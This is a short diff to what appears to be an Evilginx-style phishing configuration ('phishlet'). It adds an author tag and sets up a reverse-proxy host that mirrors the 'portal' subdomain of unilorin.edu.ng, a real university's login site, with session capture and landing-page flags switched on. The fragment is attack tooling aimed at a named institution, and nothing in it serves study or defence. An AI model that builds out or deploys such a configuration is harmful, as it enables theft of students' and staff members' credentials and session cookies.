@@ -1,3 +1,4 @@
+author: '@fatiu'
 min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'portal', orig_sub: 'portal', domain: 'unilorin.edu.ng', session: true, is_landing: true, auto_filter: true}
